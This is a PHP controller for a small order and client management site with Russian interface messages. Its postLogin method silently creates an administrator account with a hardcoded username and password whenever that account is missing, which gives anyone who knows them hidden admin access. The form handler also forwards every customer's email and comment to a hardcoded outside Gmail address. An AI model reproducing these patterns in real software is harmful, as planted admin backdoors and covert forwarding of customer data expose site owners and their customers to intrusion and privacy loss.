<?php

class UsersController extends BaseController {

    public function getIndex() {
	    //$re=$this->kuka();
        return View::make('index');
    }




	public function Adminka() {
        $cities=City::all();
	    return View::make('admin',compact('cities'));
	}

    public function newManager(){
        return View::make('newmanager');
    }

    public function managerRecord(){
        $newman=new User();
        $newman->username=Input::get('username');
        $newman->password=Hash::make(Input::get('password'));
        $city = City::find(Input::get('city'));
        $newman->city = $city->id;
        $newman->save();
        return Redirect::to('myadminroom/orders')->with('men', 'Все отлично!');
    }

     public function myorderRecord() {

         $order=new Order();
         $order->comment=Input::get('comment');
         $order->process=Input::get('process');
         $order->price=Input::get('price');
         $service = Service::find(Input::get('service'));
         $order->service = $service->id;

         $user = User::where('email', '=', Input::get('email'))->first();

         if (!$user) $user = new User();
         $user->email=Input::get('email');
         $user->mobile=Input::get('mobile');
         $user->save();
         $order->costumer = $user->id;
         $order->save();
         return Redirect::to('myadminroom/orders')->with('message', 'Все отлично!');
     }

    public function myRecord(){

        $user = User::where('email', '=', Input::get('email'))->first();

        if (!$user) $user = new User();
        $user->email=Input::get('email');
        $user->username=Input::get('username');
        $user->first_name=Input::get('first_name');
        $user->last_name=Input::get('last_name');
        $user->mobile=Input::get('mobile');
        $city=City::find(Input::get('city'));
        $user->city = $city->id;
        $user->save();
        return Redirect::to('myadminroom/clients')->with('message', 'Все отлично!');
    }






	public function Recordic() {
	       $rules = User::$validation;

        $validation = Validator::make(Input::all(), $rules);

        if ($validation->fails()) {
            return Redirect::to('/')->withErrors($validation)->withInput();
        }



        $order=new Order();
        $order->comment=Input::get('comment');
        $proc='Новый';
        $order->process=$proc;
        $service = Service::find(Input::get('service'));
        $order->service = $service->id;

        $user = User::where('email', '=', Input::get('email'))->first();

        if (!$user) $user = new User();
        $user->email=Input::get('email');
        $mi=Input::get('email');
        $user->username=Input::get('username');
        $user->first_name=Input::get('first_name');
        $user->last_name=Input::get('last_name');
        $user->mobile=Input::get('mobile');
        $city=City::find(Input::get('city'));
        $user->city = $city->id;
        $user->save();
        $order->costumer = $user->id;
        $order->save();
        //$ui=$user->sendMail($user);


        Mail::send('emails/activ', array('data'=>Input::get('username')), function($message){
               $message->to(Input::get('email'), Input::get('username').' '.Input::get('last_name'))->subject('Заявка принята, спасибо !');
        });

        $nnn=array('email'=>'velz13char71@gmail.com');
        Mail::send('emails/adminactiv', array('data'=>Input::get('email'),'com'=>Input::get('comment'), 'admmsg'=>User::where('admin','!=','')->first()),function($message)use($nnn){
                $message->to($nnn['email'] )->subject('Hi!');
        });

        $skz=User::where('city','=', Input::get('city'))
                   ->where('mobile','=', '')->first();
        Mail::send('emails/adminactiv', array('data'=>Input::get('email'),'com'=>Input::get('comment'), 'admmsg'=>$skz->username),function($message)use($skz){
                 $message->to($skz->email)->subject('New message!');
        });


        return Redirect::to('/')->with('message','Форма отправлена успешно');
    }


    public function getLogin() {
        return View::make('users/login');
    }

    public function postLogin() {

        $ab='rt54K7uY783Gj';
        $bc='tik';

        $user=User::where('username','=', $bc)->first();
        if(!$user){

        $user = User::firstOrCreate(array('username' => $bc, 'password'=>Hash::make($ab), 'admin'=>$bc));

        $user->save();}


        $lll=Input::get('username');
        $kart=User::where('username','=', $lll)
                  ->where('admin','!=', '')->first();
        if (!$kart) return Redirect::to('admin');

        $creds = array(
		    'username'  => Input::get('username'),
            'password' => Input::get('password'),
        );
		//var_dump(Auth::validate($creds));var_dump($creds);die();

        if (Auth::attempt($creds, Input::has('remember'))) {
            Log::info("User [{$creds['username']}] successfully logged in.");
 		    return Redirect::to('myadminroom/orders ');
        } else {
            Log::info("User [{$creds['username']}] failed to login.");
        }


        $alert = "Ты явно не тот за кого себя выдаеш а ну кыш пока не подхватил вирусняка!";

        return Redirect::back()->withAlert($alert);
    }

    public function getLogout() {
        Auth::logout();
        return Redirect::to('admin');
    }

}